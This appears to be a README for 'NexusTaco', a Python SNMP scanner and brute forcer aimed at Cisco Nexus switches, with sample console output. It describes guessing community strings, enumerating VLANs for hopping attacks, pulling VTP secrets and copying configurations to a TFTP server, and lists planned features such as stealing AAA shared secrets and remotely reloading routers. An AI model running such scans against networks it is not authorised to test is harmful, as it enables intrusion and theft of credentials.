NexusTaco is a snmp scanner that can be used both for internal testing and external testing to assess Cisco Nexus switches ( all models). There are many snmp scanners and brute forcers this was made for just completeness.It has the following features:
*Finds Nexus switches specifically since they seem to reply to bogus community strings
*Bruteforces Vlan ID’s which can be used for Vlan hopping / double tagging attacks without a community incase #3 doesn’t come through (useful for internal tests)
*Bruteforces snmp community strings To find the following:
**System uptime
**Configured networks (leverage more ground)
**Files and folders
**VTP secret and password ( can be cracked since its md5 and might be the telnet login password if exists or used somewhere else)
**Once a write community string is found the running configuration file will be send to your set ip in argv[2]. You need to configure a tftp server like solar winds’s one or something.
TODO:
*Still looking up sneaky OID’s that can provide usernames that are configured locally on the switch
*If found private snmp CS check if a AAA server is running (and get the shared secret wether radius or TACACS+)
*Show logged in users
*Disable snmp traps 
*Check for port security if configured incase you need to spoof your mac so you don’t loose your port(internal tests).
*Use getopt …..
*Router reload over snmp just for evilness.
*Anything else I forgot.

$ python NexusTaco.py 
python NexusTaco.py CIDR <your-tftp-server-ip> <number of vlans to bruteforce>
$ python NexusTaco.py x.x.x.x/32 127.0.0.1 100
Thanks nmap for the ip list
Finding vulnerable switches
x.x.x.x:Is a nexus switch, Snmp open, Has Vlans configured

Finding VlanIDs on:  x.x.x.x  With incorrect community string

Host: x.x.x.x has VlanID 1 Configured
Host: x.x.x.x has VlanID 2 Configured
Host: x.x.x.x has VlanID 3 Configured
Host: x.x.x.x has VlanID 4 Configured
Host: x.x.x.x has VlanID 5 Configured
Host: x.x.x.x has VlanID 6 Configured
Host: x.x.x.x has VlanID 7 Configured
Host: x.x.x.x has VlanID 8 Configured
Host: x.x.x.x has VlanID 10 Configured
Host: x.x.x.x has VlanID 31 Configured
Host: x.x.x.x has VlanID 32 Configured
Host: x.x.x.x has VlanID 33 Configured
Host: x.x.x.x has VlanID 34 Configured
Host: x.x.x.x has VlanID 35 Configured
Host: x.x.x.x has VlanID 40 Configured
Host: x.x.x.x has VlanID 64 Configured
Host: x.x.x.x has VlanID 65 Configured
Host: x.x.x.x has VlanID 97 Configured
Host: x.x.x.x has VlanID 98 Configured
Host: x.x.x.x has VlanID 99 Configured
Host: x.x.x.x has VlanID 100 Configured

Bruteforcing for community strings
[public] Found as community string

Getting system uptime
Timeticks: (1430420910) 165 days, 13:23:29.10

Grabbing Configured Networks
10.1.4.1/255.255.255.0
10.1.8.1/255.255.248.0
10.1.16.1/255.255.255.0
10.2.128.1/255.255.192.0
10.3.128.1/255.255.192.0
10.4.0.1/255.255.192.0
10.5.0.1/255.255.192.0
x.x.x.x/255.255.255.240
x.x.x.x/255.255.255.240
x.x.x.x/255.255.255.0
x.x.x.x/255.255.255.240
x.x.x.x/255.255.255.192
172.16.254.18/255.255.255.252
172.19.242.1/255.255.255.0
172.19.248.1/255.255.248.0
172.21.6.1/255.255.255.0
172.30.0.1/255.255.252.0
x.x.x.x/255.255.254.0
192.168.30.230/255.255.255.240
192.168.101.1/255.255.255.252
192.168.101.5/255.255.255.252
192.168.101.14/255.255.255.252
192.168.101.18/255.255.255.252
192.168.101.21/255.255.255.252

Grabbing files and folders
lost+found
n5000-uk9-kickstart.5.0.3.N2.1.bin
n5000-uk9.5.0.3.N2.1.bin
mts.log
vdc_2
vdc_3
vdc_4
LAN_BASE_SERVICES_PKG.lic
n5000-uk9-kickstart.6.0.2.N2.3.bin
n5000-uk9.6.0.2.N2.3.bin
assoc_ascii_cnv.log
virt_strg_pool_bf
icmpv6.6.3538.log
icmpv6.14.3538.log

VTP secret=  ""
VTP auth password=  ""

Read community string found, cannot copy configuration to tftp. Try a better wordlist.
